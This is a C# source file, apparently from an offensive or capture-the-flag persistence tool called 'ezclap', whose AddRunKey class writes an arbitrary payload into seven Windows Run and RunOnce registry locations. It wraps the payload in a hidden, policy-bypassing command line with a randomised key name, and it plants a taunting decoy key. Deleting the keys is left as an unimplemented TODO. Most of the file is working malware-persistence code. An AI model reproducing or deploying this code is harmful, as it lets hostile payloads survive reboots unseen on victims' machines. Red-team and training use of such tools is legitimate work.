using System;


/*  Name: AddRunKey 
 *  Description: Adds the payload in various RunKey registry location. 
 *  The RunKeys themselves are hardcoded in RegistryKeys.cs, as there are only 7 known 
 *  RunKey locations that can be used for persistence. 
 *  
 *  Params:
 *      - string[] name = Name of the registry key to be added into RunKey locations 
 *      - string payload = Payload string to be executed
 */
namespace ezclap
{
	public class AddRunKey
	{
		public AddRunKey (string[] names, string payload)
		{
            Initialize(names, payload);
		}
		public static void Initialize(string[] names, string payload)
		{
            Random rnd = new Random();
            int rndNameIdx = rnd.Next(0, names.Length - 1);
            /*
             *  Description: Add RunKey registry key with payload  
             */

            payload = "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payload;

            Utils.setHKCUSubKey(RegistryKeys.RunKey, names[rndNameIdx], payload);
            Utils.setHKCUSubKey(RegistryKeys.RunOnceKey, names[rndNameIdx], payload);

            Utils.setHKLMSubKey(RegistryKeys.RunKey, names[rndNameIdx], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunOnceKey, names[rndNameIdx], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunServices, names[rndNameIdx], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunServicesOnce, names[rndNameIdx], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunOnceEx, names[rndNameIdx], payload);

            Utils.setHKLMSubKey(RegistryKeys.RunKey, "Good job you have found something", "There is a hidden key as well. Try to find that! That is why the error message is showing up.");
            
        } 

        public static void deleteKeys()
        {
            // TODO: Implement deleting runkeys 
            // Open up registry keys and see if there are names of the key. If name found, delete the key. 
        }

	}
}
